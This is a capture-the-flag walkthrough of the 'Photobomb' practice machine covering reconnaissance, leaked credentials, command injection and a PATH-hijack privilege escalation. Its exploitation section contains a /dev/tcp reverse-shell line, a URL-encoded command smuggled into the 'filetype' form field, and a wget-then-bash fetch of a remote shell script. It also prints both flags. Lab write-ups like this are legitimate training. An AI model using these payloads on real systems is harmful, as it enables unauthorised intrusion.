### IP
`10.10.11.182`

# Reconnaissance

### nmap

`nmap -sC -sV 10.10.11.182`
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


We can see that the page includes a file called `photobomb.js` with the following source:

```js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

We can guess that the text in the link is a set of gredentials: `pH0t0:b0Mb!`

These credentials work for logging in to `/printer`


# Exploitation

### BurpSuite

We can intercept the requests made by the site when we download a photo in burpsuite.

Here is an example:

```
POST /printer HTTP/1.1
Host: photobomb.htb
Content-Length: 96
Cache-Control: max-age=0
Authorization: Basic cEgwdDA6YjBNYiE=
Upgrade-Insecure-Requests: 1
Origin: http://photobomb.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://photobomb.htb/printer
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Connection: close

photo=calvin-craig-T3M72YMf2oc-unsplash.jpg&filetype=jpg&dimensions=3000x2000
```

It looks like we are converting a photo to another filetype and/or dimension when downloading.

Thus, I'm assuming we might be able to inject commands if the params from the requests are being placed straight into the command running on the server.

### Command Injection

I tried injecting commands into all 3 parameters, and it appeared that the `filetype` param was injectable.

This command allows for a reverse shell:
`sh -i >& /dev/tcp/10.10.14.33/4444 0>&1`

Thus, I url-encoded it and placed it into the filetype param following a semi-colon

This was the request I tried:

```
POST /printer HTTP/1.1
Host: photobomb.htb
Content-Length: 96
Cache-Control: max-age=0
Authorization: Basic cEgwdDA6YjBNYiE=
Upgrade-Insecure-Requests: 1
Origin: http://photobomb.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://photobomb.htb/printer
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Connection: close

photo=calvin-craig-T3M72YMf2oc-unsplash.jpg&filetype=jpg%3bsh+-i+>%26+/dev/tcp/10.10.14.33/4444+0>%261&dimensions=3000x2000
```

Unfortunately, this didn't work - presumably due to all of the special characters in the command.

Thus, I tried to instead upload a file with the reverse shell and run `wget 10.10.14.33:8000/revshell.sh` and then `bash revshell.sh`. This worked as expected when serving the revshell using `python3 -m http.server`

We can set up a listener with `nc -lvnp 4444` and send the request to get a reverse shell.

Since we are logged in, we can look for the file that is causing the vulnerability.

The following lines of code in `server.rb` shows the issue:

```ruby
filename = photo.sub('.jpg', '') + '_' + dimensions + '.' + filetype
  response['Content-Disposition'] = "attachment; filename=#{filename}"

  if !File.exists?('resized_images/' + filename)
    command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename
    puts "Executing: #{command}"
    system(command)
  else
    puts "File already exists."
  end
```

The code has the filename parameter last, hence why we had to inject commands there, and is executing it directly using the `convert` utility


We are logged in as the `wizard` user and get the user flag: `96447aa9cea25ad096b785b186308018`


# Privilege Escalation

Running `sudo -l` shows that we can run `/opt/cleanup.sh` as root without a password:

```
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh

```

The following is the source of `/opt/cleanup.sh`

```bash
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

It looks like almost everything executed uses an absolute path, but `find` is executed using its relative path. Crucially, the `SETENV` tag allows us to set environment variables when running the command.

Thus, we can make our own `find` file to get root.

I put the following file in `/dev/shm/find`

```bash
#!/bin/bash

/bin/bash
```


We can now mark this as executable and run `sudo PATH=/dev/shm:$PATH /opt/cleanup.sh`

This lets us become root and read the root flag: `d9f300357b874ebd195cb318bc08e375`

